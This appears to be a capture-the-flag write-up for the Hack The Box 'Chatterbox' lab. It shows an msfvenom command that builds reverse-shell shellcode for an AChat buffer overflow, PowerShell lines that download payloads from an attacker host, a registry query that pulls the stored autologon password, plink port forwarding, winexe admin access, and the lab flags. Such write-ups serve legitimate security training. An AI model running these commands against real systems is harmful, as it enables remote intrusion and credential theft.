---
layout: post
title:  "HTB Chatterbox Windows"
description: Tools and Techniques used, msfvenom, windows enumeration, port forwarding
tags: Windows, HTB, enumeration
---
# Chatterbox
# Recon
1. Nmap scan
```ruby
PORT     STATE SERVICE REASON          VERSION
9255/tcp open  http    syn-ack ttl 127 AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   syn-ack ttl 127 AChat chat system
```
![](https://lh3.googleusercontent.com/Ow3sXRep1uPWbz4lXhpFvPsKqG_lXQ_MqEDiewySwDGwFJK78AlJffdYrzFyWKPLKTysXJcJkFUDkTDhion_cUnvyqhkBfmyPQ_ZrTgnPkj25O0XXarfcs8KbC_JP2hblOuJrKL1two5ZkEcPb5pimX4wsddGgz4F7P1R5ACbrsMJiHAT1Xl-n_QkroP_xyB2TTIxxORo0xD4yXDJRVXXjOlAE9D6-U7xB8h41fSdeQoA176bBKF7xKf8w1wo8bbRSszz-Z-_IfF2wAhXmtMwwgf_OlUbog4qcQ6N8Os31Oywb_qaGtV59gs3xpPlrMZ7uKzh8GH_a-NR1JIkqEPF4IvGg1YmOKPMftdJkdxK7uG2qRcMGfAd9ippX_otvp1KY_mLz7bEfegGM8ft_IZ8iqtE0yLMMryuWJ5p3HoZbhwZzqLMHjopIrGx0oH4XGAwIsFxegKAscyn9JxkwXNSq_UapuAiLuviMnRlGFCLjsCReSscSThWWVkX0tLjY3nSD50o8iapeaZaQiimVpxqji3xTTx3ijBzWhfzRqlsJAylFfmUAfuCsqHnTn2NRFglhBG92Bbw78JNs4RuHQDlGwX9_bNZzJzHL8hwqGka-g8jzXrcdoSq-xQAiP6Yimuk8PQELf1b-UeQmO2UpsTyMQtiMG5iWrcU8UrHOV0nVpRH3m-GYouIek=w634-h248-no)

# EXPLOITATION
1. We use Achat python exploit "CVE:2015-1578 2015-1577"
2. We generate shellcode to use with the Achat BoF
```ruby
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.34 LPORT=9999 -e x86/unicode_mixed -b
'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d
\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c
\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab
\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba
\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9
\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8
\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7
\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6
\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' 
BufferRegister=EAX -f python
```
3. We set-up nc and we get a reverse shell as user Alfred.

**Optional**: You can also create a `meterpreter` shell with msfvenom and upload it to the target machine. Then use multi/handler to catch it.Ex
```ruby
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.34/reverse.exe', 'reverse.exe')"
```
![](https://lh3.googleusercontent.com/E0KTtqED2h8NIIbu0TeAYzb_ZdtqpaWwMKpTnsVsF3sUjhBh7w017TcrkHWs8QSkfKLxseMPKHVS3ic6w60KZuBRs464UDvZb1BLy1ev_oCauy3a1e31bWoAOUSxwjeTuMkiPY2RxasW3vYYzdEWQlYa3OsYg_2Tfy9n_IKaAyjpBUf7kZXk7bWzbsT6Rsip-lnqI9OKtnuro5vQXYusqJA3lggcf0siKmIgM7Kr0yMdPs6lHqb9uokZYnGJ1zMWUNuOU7h-SiXUVcW8ayedQVYSi1Z0J8fqbZle8kFBQa2GEpDS7oNpEj95L00oaBcWJRZ46cEA_9UntAMA9xd3fFOr6eOA9dgqCknPSksADSeoEn6QuUsqlkAIYgbJ84zt9TEUfFw4gTQavyyrIeAWck4r7utnygDfzwPdeng6RKhR53yMP9xE5QdPnDDEYXHXeBGXkgJHJTtUTT7fdwWlROq4gMSmjOLdOUEl00r0P-YVJnmVbpZ4nNvDQn6kWWDygYd26o5CTG4bkS3b21DuW_Wj0aMBoDhLuXNrJA9-M_5XtJm6CoxxLV-ACYJGd6tsDBOvjrNuBqzMNQ2CQh1FmiSoGnahyooXZ3hrZvp2O7s29hnrPYkhpcjcXEdKVNHJuXcHgiv6emknwMetDGrXXlThMkAAzMpFoXPAFH-PKI7C9ulnhYTbB6I=w610-h500-no)

# Privilege Escalation Port-forwarding
1. Doing some priv-esc check we find the password for user Alfred

```ruby
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

```ruby
DefaultDomainName    REG_SZ    
DefaultUserName    REG_SZ    Alfred
DefaultPassword    REG_SZ    Welcome1!
```
![](https://lh3.googleusercontent.com/w8M3b82YBZqWsjkFH52BdDXFg08eoMzGRCu1ZhaHPAWFcbMD2USy-g7-qIswTFJ2t0Ai-c2uB6R0kpgCH1aRyqDYBsSBq-y4AIkiiN1EmMheKfhYUJdjL6my0AhUee3Od2RlC8YTq8H8XiyAJab3d1TzgNxHfOZeUgHPonBV0w4VtaHe5lENmhOJT1FQAZQRini2zh1xStD7anH1g1gnRdVhGuatw0sxlWZ6sDLwVNu8gDb5TwAwmLxOTZ99JX_y_d3lh351cJNubcjjBa1B-oUkFYT6SZPdECW1yIoqtE6s4KX5xnxkOEuPtdvLrLZSX5QQn-04EgqnUS48DmIgwXjYH9DMV4nbwfEgqq5jBf9fdNnpKodiFHrCVABcrkKnxVogEbtKUFxBd3TLNhG6gXAV3UbtHkh9TGPu1Jqq2RrFbqG-Wu0y7XxTXWnqYMx_WpDnK21BZwjZv7hUD8-u5T0evNwNiZUPWyXA3IC4RvS10aX_UwbzFWnLAujE3Wr27vE0C1r0qEWCWUqKmHFgsG5pEHQpzJt_OXnpXBrKlvKC8hcn51iP208DNvyDQHmOPz8espFyrcu0Vq9Jj6BrtOROWT3PXkEn7l4Tk3gpJLtIPqn5UFRednoDMgb7tp3bTym_5rHpswPsENPZY3tpkBJRSHdAF3lxWWKJ4KfUmBG6p97mA06nH_A=w795-h156-no)

2. We use the obtanined credentials and try to reuse them with the admin account. To do that we need to set up SSH in our machine
and  open smb port 445 in our target machine using "plink.exe". Then we do a port-forwarding and then a reverse connection. 
First.
```ruby
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.34/plink.exe', 'plink.exe')"
```
![](https://lh3.googleusercontent.com/hLxLdIRfKxQy28HlU6nV2w6JFmlMM7a3afhb2IxG_e4Ykz1FaZXiBsPq0zJIv9ezpDsKXHYm8irI5edlg1MYtsWOZudH6Onf-WxFLvbGarZ6qGYtrTN28Ai6z4whmkHJLH5iO0g2hWAp0QitHrvwbup2Lc7Z7lg2wHwWKRJ9AJ1nkVoYNVuJ-LtSl3DeJ6Hk6ZHQqwHqQoT0Wpitw15BrCyetmGr55kmVqAAG2SwEZVU_Bp0yC7B_EBz184H2KhvJUZQ_NGKbxqqSUOUhHrj9aKHFTEX1mJ-869u4fE6oimEY37Nv0w4yDWCcXOsvXM7sJGHAdLGm1Z001nIRcMiTIx8k1dVXmxqSULC1XtoPL56b0nH5yP3k8SRx88o--AYyyFY5mzURdVim5v3k9_rkUZZ9F4eJGHQOD-VzdqjQjNrNdgKQhk_LKmCT1y2i5ZGHTBxLfUUR2we1i_EIxnGUhVeleSP1oJT6vM06XlOnVYgLJC2uI5mOQHy42WVTnpeEyehVF5ClrSUIcbrROyl5zIs0E3dKOzaSzZIaIvbSujjUZl4Rtp01kyyhGgXRoSCjjqFxtLgesGCKzy3Mf_siDbhqIJfebTaUgtP76LNqyenmXgobsEiFdl6uAAapSDtUkcuTbTD84oCSsjFxoFzLCi6MqwiTd55ychDJTKYL5J1mesYYWDrX4o=w573-h319-no)

![](https://lh3.googleusercontent.com/ABF0QL82Mey0TC-c-kbA1mjoM4JsuHBECUzDFAghPFjcG6GC7PanvKqO7X2_v0cFmBNPzNhm6Le7GyJLEFFLggQaWnE3pvvZIMHCmf8Ot1QUEYta-S-poJnV_5oD4Gatwdi6SeYJvuxhbfEvf1rbxh8xExHZrOgYNCs9CPbWJNjxmY4KsF4o-CEt0RWkcAXVEnM7NZAWP_nd6cw8fqkMHP2HlDfBvjXh0URXLWdQJlUqT78-8Lhex2GejC9-I3EQqL6k_AcqCJJhQ9fDmuNnD0ChvbZZtKyJVyfse6URGDW0Hdhfa9rWDGX-AQ2gcC7zD4XnX9_1w1rDccvwz1NZCclaT3M02vR3qnMvsNhnOg9_24pEFSodDSLUdSNKFShEcUeqgVs36nyQM9XWmYV0ElpqYvGSnP7dcpCqHaH2xR-aHfFIy0Xrw-cYeNgN9EYlhcJ0T9tO5X54rBo3vMJ0PWNwBs_UjjL_Ows6Bq6VkWT9T-jWHtbGREfd0xboX6yMetg32u6Pf1hc9QK4U92oJPGNFjn6Ir7A7nT245KHjKDyouZqvGmWH1NWvneHfDs1k_8Ur-F93cHJMQhwV9Qq9ThFch11iRHFm41jmXN_8AaOSMTNjZKuh1mzIOMK-eKVntM1bwUiWV-TSs_liP05m_oInhZa6MZrXPRCj7foAQwPetDeuvAf2VM=w995-h94-no)

Then.
```ruby
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.34
```
![](https://lh3.googleusercontent.com/3hgewaHdfTeTGCjqWaAFIJpoNsUznouWC1xlwtoIgnhF6HpRn22Z0FbnrDC8mXzVf9_5xwQe3rJi16uK83JauxdvQ3hvMnNz83WR-ff7CiC29tmWxPIElI6e47v80VrQD04tjeaLPel2qJEfv3qwDMAwzXYz99LO8PYoloRu2zuf1GiE-yTbBG4QIWhzr7WXpCOs7_kgYueM46LQhoxZinHBrhe6sVxhFpra-49dHolelEogpxFSEj0Nf1m5xeE_toUHaY9cDYwmdPm8bjZ8_gOd1PlsChrRNMj0QFQ-YyXvAN5kWocC7zQ86p42jrFxRQlhbIEoQQGBMun81Zfd9nUh6pmYuVJ1Yu6jtvaOm0bAjN7sG_ziN964v9_0DPjaFlpNbsB03AM3pSxpzUwIQXQVLQ61WuRYTNF1039tiKnfG6AeXCP5TuQqS5z-BpVQ29hyD44B_KR8MChHtQRHy2tpuxjEAdxpZa-HoFHmTjau7TSuEDe0FGynjcLVuUgcnTMCkJnF2BXme1LENos41q_CFiJCBswLoe3V5Y84VUUkNWd4-H0GfWW5Z4D50pMW3wPVYd3JaHmNI2aPydPlkoUT1Vjna9RETPovCkd-2DAxu4Q6ItEDFl4qkEG7tBX3SYbZ_vwcsb3oOZC4cCvo5V3LBewHKcbC6myd9b-77gUIwK-vF2W8EC8=w671-h377-no)

3. We check with netstat to make sure the port 445 is open and connecte to us
4. The we connect reverse using **winexe** and password **"Welcome1!** and we get Admin.
```shell
winexe -U Administrator //127.0.0.1 "cmd.exe
```
![](https://lh3.googleusercontent.com/qJ_iqW9ZDj5NmYHAZhf9jIyp64xLkOF40n8BlPayOvlhVlO6ES1Ud4QqmtpzKuR_jeKSZFcUhGcM5wHNsX089y1-UEH-czLi5PQDnrWRpHcLiRC4HN0a1t_gH6w84RyS2AlIS_vb1ocXjiOV04l-fyvKXqjzqXO0dx2fEG5Siq8hQrJTKsXsDt3yGy_gvGbjLC25SQq97tleHu8n4SCnv2Cjc6DD_6KwehKy7RrJw601snGgZs1Lyx3dpGCcYkOqq2agv-ByaJqWdbhu8cWlzmKQIj-TpuYuFSknz0G0NAjmb0f3IN-ozXv7dP284IcPrDprQFC88QeD_PHfaowY7KERozetcjAFuo1zvQXVDf4Ke20SNOF8lUH8HxjFJxR3uWM8tDu5z9PeTSwvX7NDl2QewQvC1iWSBpNhYotcvim9J4AekXJfTRoUJ1kzaKhbWc7l52ycI8xMUEL9cO0MTMRWN99oD-4KYzZuuGliQT96SpupGQh6PBo9NHgiESB60RbgoAC0bBYDmNkiFzz8VfnDTisQUcXlNpxhvp292s0gjKAhlB04IKC2kKdzPetPbnp51hdsYQ9bFMXerg5vguBK7hew6k6bgzewhoQ5otrBQdVh68vowY2lKnV3aDVD_YnWwP0K2gjFDVUmMUj4rmf95niOwpzc6AGgxgihyn64Q88xaoL6Hq8=w698-h203-no)

# FLAGS
```shell
USER  "72290246dfaedb1e3e3ac9d6fb306334"
ROOT  "a673d1b1fa95c276c5ef2aa13d9dcc7c" 
```
